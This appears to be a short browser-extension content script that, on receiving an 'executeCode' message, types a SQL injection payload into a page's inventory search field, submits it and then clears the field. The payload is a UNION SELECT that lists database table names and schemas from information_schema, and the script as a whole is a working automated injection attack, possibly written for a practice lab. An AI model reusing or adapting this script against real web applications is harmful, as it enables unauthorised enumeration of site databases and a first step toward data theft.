chrome.runtime.onMessage.addListener(function(request) {
  if(request.action == "executeCode") {
    $("#inventoryText").val("' UNION (SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables); -- ");
    $("#inventoryBtn").click();
    $("#inventoryText").val("");
  }
});